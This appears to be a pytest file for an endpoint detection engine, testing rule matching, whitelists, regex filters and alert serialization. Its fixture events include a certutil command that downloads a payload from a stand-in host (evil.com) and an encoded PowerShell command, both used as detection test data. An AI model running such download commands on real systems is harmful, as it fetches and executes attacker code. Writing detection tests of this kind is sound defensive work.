"""
Tests for detection engine
"""
from datetime import datetime
from typing import Any

from collectors.base import Event
from core.engine import Alert, DetectionEngine
from core.rule_loader import Rule

_TIMESTAMP = datetime(2025, 1, 1, 12, 0, 0)


def _event(**overrides: Any) -> Event:
    """Build an event with concise, valid defaults."""
    values: dict[str, Any] = {
        "timestamp": _TIMESTAMP,
        "platform": "windows",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -Command Get-Process",
        "user": "user",
        "process_id": 1234,
    }
    values.update(overrides)
    return Event(**values)


def _rule(detection: dict[str, Any], **overrides: Any) -> Rule:
    """Build a rule with concise, valid defaults."""
    values: dict[str, Any] = {
        "name": "Test Rule",
        "id": "WIN-999",
        "platform": "windows",
        "severity": "high",
        "detection": detection,
    }
    values.update(overrides)
    return Rule(values)


def _engine(
    detection: dict[str, Any],
    **rule_overrides: Any,
) -> DetectionEngine:
    """Build an engine containing one rule."""
    return DetectionEngine([_rule(detection, **rule_overrides)])


def test_alert_creation() -> None:
    """Test Alert dataclass creation."""
    event = _event(
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        user="baduser",
    )
    alert = Alert(
        rule_id="WIN-001",
        rule_name="Test Rule",
        severity="high",
        event=event,
        timestamp=event.timestamp,
        mitre_attack=["T1105"],
        description="Test description",
        response=["Test response"],
    )

    assert alert.rule_id == "WIN-001"
    assert alert.severity == "high"
    assert alert.event.process_name == "certutil.exe"


def test_alert_to_dict() -> None:
    """Test Alert serialization to dictionary."""
    event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
        user="testuser",
        process_id=5678,
    )
    alert = Alert(
        rule_id="WIN-002",
        rule_name="Test Rule",
        severity="medium",
        event=event,
        timestamp=event.timestamp,
        mitre_attack=["T1059"],
        description="Test",
        response=["Action 1"],
    )

    result = alert.to_dict()

    assert result["rule_id"] == "WIN-002"
    assert result["severity"] == "medium"
    assert "event" in result
    assert result["event"]["process_name"] == "cmd.exe"
    assert "timestamp" in result


def test_engine_initialization() -> None:
    """Test DetectionEngine initializes with rules."""
    rule = _rule(
        {"process_name": "test.exe"},
        name="Test",
        id="WIN-999",
        severity="low",
    )
    engine = DetectionEngine([rule])

    assert len(engine.rules) == 1
    assert engine.rules[0].id == "WIN-999"


def test_basic_rule_matching() -> None:
    """Test matching on process name and all command fragments."""
    engine = _engine(
        {
            "process_name": "certutil.exe",
            "command_contains": ["-urlcache", "http"],
        },
        name="Certutil Download",
        id="WIN-001",
    )
    event = _event(
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        user="baduser",
    )

    alerts = engine.match_event(event)

    assert len(alerts) == 1
    assert alerts[0].rule_id == "WIN-001"
    assert alerts[0].severity == "high"


def test_rule_no_match_wrong_process() -> None:
    """Test rejection when the process name differs."""
    engine = _engine(
        {
            "process_name": "certutil.exe",
            "command_contains": ["-urlcache", "http"],
        },
        name="Certutil Download",
        id="WIN-001",
    )
    event = _event(
        process_name="powershell.exe",
        command_line="powershell.exe -urlcache http://test.com",
    )

    assert engine.match_event(event) == []


def test_command_contains_and_logic() -> None:
    """Test that every command_contains item is required."""
    engine = _engine(
        {
            "process_name": "cmd.exe",
            "command_contains": ["word1", "word2", "word3"],
        },
        id="WIN-002",
        severity="medium",
    )
    partial_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe word1 word2",
    )
    complete_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe word1 word2 word3",
        process_id=5678,
    )

    assert engine.match_event(partial_event) == []
    assert len(engine.match_event(complete_event)) == 1


def test_whitelist_by_user() -> None:
    """Test filtering by a whitelisted user."""
    engine = _engine(
        {
            "process_name": "certutil.exe",
            "command_contains": ["-urlcache"],
        },
        id="WIN-003",
        whitelist={"users": ["SYSTEM", "Administrator"]},
    )
    whitelisted_event = _event(
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache http://test.com",
        user="SYSTEM",
    )
    allowed_event = _event(
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache http://test.com",
        user="baduser",
        process_id=5678,
    )

    assert engine.match_event(whitelisted_event) == []
    assert len(engine.match_event(allowed_event)) == 1


def test_whitelist_by_parent_process() -> None:
    """Test filtering by a whitelisted parent process."""
    engine = _engine(
        {"process_name": "certutil.exe"},
        id="WIN-004",
        whitelist={"parent_processes": ["msiexec.exe", "sccm.exe"]},
    )
    whitelisted_event = _event(
        process_name="certutil.exe",
        command_line="certutil.exe -verify cert.cer",
        parent_process_name="msiexec.exe",
    )
    allowed_event = _event(
        process_name="certutil.exe",
        command_line="certutil.exe -verify cert.cer",
        process_id=5678,
        parent_process_name="cmd.exe",
    )

    assert engine.match_event(whitelisted_event) == []
    assert len(engine.match_event(allowed_event)) == 1


def test_whitelist_by_path() -> None:
    """Test filtering by a whitelisted working directory."""
    engine = _engine(
        {"process_name": "powershell.exe"},
        id="WIN-005",
        severity="medium",
        whitelist={
            "paths": ["C:\\Program Files\\", "C:\\Windows\\System32\\"]
        },
    )
    whitelisted_event = _event(
        working_directory="C:\\Program Files\\MyApp",
    )
    allowed_event = _event(
        process_id=5678,
        working_directory="C:\\Users\\baduser\\Downloads",
    )

    assert engine.match_event(whitelisted_event) == []
    assert len(engine.match_event(allowed_event)) == 1


def test_multiple_rules_match_one_event() -> None:
    """Test that one event can match multiple rules."""
    rules = [
        _rule(
            {"process_name": "powershell.exe"},
            name="PowerShell Execution",
            id="WIN-010",
            severity="medium",
        ),
        _rule(
            {
                "process_name": "powershell.exe",
                "command_contains": ["-encodedcommand"],
            },
            name="PowerShell Encoded Command",
            id="WIN-011",
        ),
    ]
    engine = DetectionEngine(rules)
    event = _event(
        command_line="powershell.exe -encodedcommand ZQBjaABvACAAIgBoAGUAbABsAG8AIgA=",
    )

    alerts = engine.match_event(event)

    assert len(alerts) == 2
    assert {alert.rule_id for alert in alerts} == {"WIN-010", "WIN-011"}


def test_platform_filtering() -> None:
    """Test that a rule only matches its configured platform."""
    engine = _engine(
        {"process_name": "cmd.exe"},
        name="Windows Rule",
        id="WIN-020",
    )
    event = _event(
        platform="linux",
        process_name="cmd.exe",
        command_line="/usr/bin/cmd.exe",
    )

    assert engine.match_event(event) == []


def test_empty_rules_list() -> None:
    """Test an engine with no loaded rules."""
    engine = DetectionEngine([])
    event = _event(
        process_name="anything.exe",
        command_line="anything",
    )

    assert engine.match_event(event) == []


def test_match_multiple_events() -> None:
    """Test matching a collection of events."""
    engine = _engine({"process_name": "certutil.exe"}, id="WIN-030")
    events = [
        _event(
            process_name="certutil.exe",
            command_line="certutil.exe -urlcache http://test1.com",
            user="user1",
        ),
        _event(
            process_name="powershell.exe",
            command_line="powershell.exe -Command test",
            user="user2",
            process_id=5678,
        ),
        _event(
            process_name="certutil.exe",
            command_line="certutil.exe -decode file.txt",
            user="user3",
            process_id=9012,
        ),
    ]

    alerts = engine.match_events(events)

    assert len(alerts) == 2
    assert all(alert.rule_id == "WIN-030" for alert in alerts)


def test_command_regex_matching() -> None:
    """Test command line regex detection."""
    engine = _engine(
        {
            "process_name": "cmd.exe",
            "command_regex": r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
        },
        name="IP Address in Command",
        id="WIN-040",
        severity="medium",
    )
    matching_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c ping 192.168.1.1",
    )
    rejected_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c dir",
        process_id=5678,
    )

    assert len(engine.match_event(matching_event)) == 1
    assert engine.match_event(rejected_event) == []


def test_parent_process_detection() -> None:
    """Test parent process detection."""
    engine = _engine(
        {
            "process_name": "cmd.exe",
            "parent_process": "winword.exe",
        },
        name="Suspicious Parent Process",
        id="WIN-050",
    )
    matching_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
        parent_process_name="winword.exe",
    )
    rejected_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
        process_id=5678,
        parent_process_name=None,
    )

    assert len(engine.match_event(matching_event)) == 1
    assert engine.match_event(rejected_event) == []


def test_case_insensitive_matching() -> None:
    """Test case insensitive Windows matching."""
    engine = _engine(
        {
            "process_name": "CMD.EXE",
            "command_contains": ["WHOAMI"],
        },
        id="WIN-060",
        severity="medium",
    )
    event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
    )

    assert len(engine.match_event(event)) == 1


def test_engine_stats() -> None:
    """Test rule statistics by severity and platform."""
    rules = [
        _rule(
            {"process_name": "test.exe"},
            name="Rule 1",
            id="WIN-100",
        ),
        _rule(
            {"process_name": "test2.exe"},
            name="Rule 2",
            id="WIN-101",
            severity="medium",
        ),
        _rule(
            {"process_name": "bash"},
            name="Rule 3",
            id="LNX-001",
            platform="linux",
        ),
    ]
    engine = DetectionEngine(rules)
    stats = engine.get_stats()

    assert stats["total_rules"] == 3
    assert stats["by_severity"] == {"high": 2, "medium": 1}
    assert stats["by_platform"] == {"windows": 2, "linux": 1}


def test_user_pattern_detection() -> None:
    """Test user regex detection."""
    engine = _engine(
        {
            "process_name": "cmd.exe",
            "user_pattern": r"^admin",
        },
        name="Admin User Activity",
        id="WIN-070",
    )
    matching_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c dir",
        user="administrator",
    )
    rejected_event = _event(
        process_name="cmd.exe",
        command_line="cmd.exe /c dir",
        user="normaluser",
        process_id=5678,
    )

    assert len(engine.match_event(matching_event)) == 1
    assert engine.match_event(rejected_event) == []
